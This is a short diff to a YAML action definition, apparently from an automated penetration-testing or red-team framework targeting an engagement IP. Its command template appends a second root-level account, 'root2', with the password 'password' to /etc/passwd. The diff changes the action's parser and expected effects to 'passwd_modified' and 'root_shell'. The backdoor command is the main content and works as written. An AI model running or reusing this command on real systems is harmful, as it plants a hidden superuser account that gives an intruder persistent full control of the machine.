@@ -7,9 +7,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: echo 'root2:$(openssl passwd -6 password):0:0:root:/root:/bin/bash'
   >> /etc/passwd
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- passwd_modified
+- root_shell
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
